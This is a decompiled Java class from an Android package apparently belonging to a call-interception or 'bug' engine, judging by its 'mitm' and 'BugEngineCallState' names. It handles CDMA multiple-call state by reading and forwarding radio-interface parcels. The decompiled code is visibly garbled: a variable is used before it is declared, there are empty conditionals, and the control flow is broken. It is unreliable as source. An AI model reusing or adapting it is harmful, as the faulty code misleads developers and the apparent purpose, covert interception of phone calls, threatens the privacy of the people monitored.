package com.vvt.callmanager.filter;

import android.os.Parcel;
import com.vvt.callmanager.a.d;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.mitm.a;
import com.vvt.callmanager.ref.BugEngineCallState;
import java.util.ArrayList;

 enum FilterCdmaCall$CallState$4
{
  FilterCdmaCall$CallState$4()
  {
    super(paramString, paramInt, null);
  }
  
  public void onEnter(Object paramObject)
  {
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    FilterCdmaCall localFilterCdmaCall = this.mFilterCall;
    BugEngineCallState localBugEngineCallState = BugEngineCallState.CDMA_MULTIPLE_CALLS;
    FilterCdmaCall.a(localFilterCdmaCall, localBugEngineCallState);
  }
  
  public Object onExit()
  {
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    return null;
  }
  
  public FilterCdmaCall.CallState processResponse(Parcel paramParcel)
  {
    int i = 1;
    Object localObject = FilterCdmaCall.a(this.mFilterCall);
    int j = ((m)localObject).c(paramParcel);
    int k = 9;
    if (j == k)
    {
      localObject = l.a(paramParcel);
      j = ((l)localObject).b;
      k = 134744072;
      if (j != k)
      {
        localObject = d.a(paramParcel);
        String str = "FilterCall";
        a locala = FilterCdmaCall.a(this.mFilterCall).a();
        i.a(str, (ArrayList)localObject, locala);
        j = ((ArrayList)localObject).size();
        if (j != 0) {
          break label120;
        }
      }
    }
    label120:
    for (localObject = FilterCdmaCall.CallState.IDLE;; localObject = this)
    {
      if (i != 0)
      {
        localFilterCdmaCall = this.mFilterCall;
        localFilterCdmaCall.c(paramParcel);
      }
      return (FilterCdmaCall.CallState)localObject;
      i = 0;
      FilterCdmaCall localFilterCdmaCall = null;
      break;
    }
  }
  
  public FilterCdmaCall.CallState processRilRequest(Parcel paramParcel)
  {
    FilterCdmaCall.a(this.mFilterCall).b(paramParcel);
    this.mFilterCall.d(paramParcel);
    return this;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterCdmaCall$CallState$4.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */